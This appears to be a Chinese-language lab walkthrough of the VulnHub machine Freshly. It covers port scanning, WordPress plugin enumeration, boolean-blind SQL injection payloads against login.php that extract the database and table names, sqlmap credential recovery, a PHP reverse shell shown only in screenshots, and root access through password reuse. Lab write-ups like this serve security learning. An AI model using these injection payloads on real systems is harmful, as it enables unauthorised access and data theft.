+++
title = '0x047 Freshly'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



这台也是用virtualbox打开的

# 端口扫描

![](/vulnhub_img/WEBRESOURCEddd932a1de8a3abffb95ac78f639055cimage.png)

![](/vulnhub_img/WEBRESOURCE455c2009ebbeffef0badbc63c9e411beimage.png)

![](/vulnhub_img/WEBRESOURCEb5a225c51f1475c5571571ef168b0a0eimage.png)

# 渗透

挨个端口来看吧：

首先是80：

![](/vulnhub_img/WEBRESOURCEaf2dc3f875e6e0852684635749191dedimage.png)

![](/vulnhub_img/WEBRESOURCEe9d96b041bbbd8fa1adecf204148e71bimage.png)

![](/vulnhub_img/WEBRESOURCE426dfb4b221c8e7b5c4e260fb022913bimage.png)

疑似线索：

tumblr_mdeo27ZZjB1r6pf3eo1_500.gif

![](/vulnhub_img/WEBRESOURCE85c909c522338f864d15ae38a341ae82image.png)

login.php存在sql注入，但是这种登录框一般是盲注，这里是布尔盲注，手动可能有点麻烦：

![](/vulnhub_img/WEBRESOURCE9b8cdf0b7df9ffa9511a62a4c8558651image.png)

443：

![](/vulnhub_img/WEBRESOURCEa69a016e339c23c326b63476710628faimage.png)

发现wordpress了，先搞wordpress：

插件：

![](/vulnhub_img/WEBRESOURCE24a07bb38b6177f4fe49dab52897ee52image.png)

用户：

![](/vulnhub_img/WEBRESOURCE8d0f76c1ef4f65a026bd8ebfed16a635image.png)

通过插件查找漏洞，找到两个可能的：

![](/vulnhub_img/WEBRESOURCEa8cb12327af8643e93b29ea6926053c1image.png)

![](/vulnhub_img/WEBRESOURCE37012679a35cd23b7d013b952dd2e1afimage.png)

8080端口：

![](/vulnhub_img/WEBRESOURCE72cdc318574904d05094929963e64f8bimage.png)

![](/vulnhub_img/WEBRESOURCEc8526fe0902d1c5354cb480e2e84757bimage.png)

![](/vulnhub_img/WEBRESOURCEcc07cb0b3e0f442396c7e0ae50303ae0image.png)

只有80端口可以，看样子得写脚本了：

写了半天，发现没有burp好使：

# 测数据库长度：

payload: 

admin 'or length(database())=5#

数据库长度为5

![](/vulnhub_img/WEBRESOURCE9451203a7dfb7dc8998c34dbad310911image.png)

![](/vulnhub_img/WEBRESOURCE2b1000252161856330d936f4f255af90image.png)

# 测试数据库名：LOGIN

substr(database(),1,1)=‘a’

第一个字符：L

admin 'or substr(database(),1,1)='L'#

![](/vulnhub_img/WEBRESOURCE9813f255e2682c0eded417d6e2a253f1image.png)

burp操作如下：

![](/vulnhub_img/WEBRESOURCEcc860519618c0c130e98d2759b9f8dfaimage.png)

![](/vulnhub_img/WEBRESOURCE07604d6e128d798f6982a360439ec7b3image.png)

![](/vulnhub_img/WEBRESOURCE4d8ac791295b8205584777c0f08b145eimage.png)

第二个字符：O

admin 'or substr(database(),2,1)='O'#

![](/vulnhub_img/WEBRESOURCEbee5d5d856578921f207ff645aa4762bimage.png)

第三个字符：G

![](/vulnhub_img/WEBRESOURCE9f13afb65f172ce693892120c4eae91cimage.png)

第四个字符：I

![](/vulnhub_img/WEBRESOURCEfb5a2d35c0daa10a2a3e0ad51c448832image.png)

第五个字符：N

![](/vulnhub_img/WEBRESOURCE6105c1e413376f47ea06d82bc71923ebimage.png)

# 测试表数量

(select COUNT(*) from information_schema.tables where table_schema='login')=2

![](/vulnhub_img/WEBRESOURCE902e80227fdc050c68b006504de74828image.png)

# 测第一张名的长度

length(substr((select table_name from information_schema.tables where table_schema='login' limit 0,1),1))=9#

第一张表长度9：

![](/vulnhub_img/WEBRESOURCE684889d4200cc64011a5e0bd2c8447fcimage.png)

第二张表长度5：

length(substr((select table_name from information_schema.tables where table_schema='login' limit 1,1),1))=5#

![](/vulnhub_img/WEBRESOURCE9ef164875d785f3826c9437bb46c78e2image.png)

前面发现一个问题，使用字符串进行对比可能导致大小写的问题

ascii(substr((select table_name from information_schema.tables where table_schema='login' limit 0,1),1,1))>97

算了，我废了，我只能被迫用sqlmap了，找个时间我再写个脚本吧：

![](/vulnhub_img/WEBRESOURCEbd861945a5451166eac242c1d824f7feimage.png)

SuperSecretPassword | admin

进入后台，改php文件反弹shell:

![](/vulnhub_img/WEBRESOURCE5b6f13dd2191d534f40f4b4b6e458ecfimage.png)

# 提权

root密码和上面的一样：

SuperSecretPassword

![](/vulnhub_img/WEBRESOURCEeaea5ad29598b8b3d7b570e159367b49image.png)

稍后研究一下布尔盲注的脚本：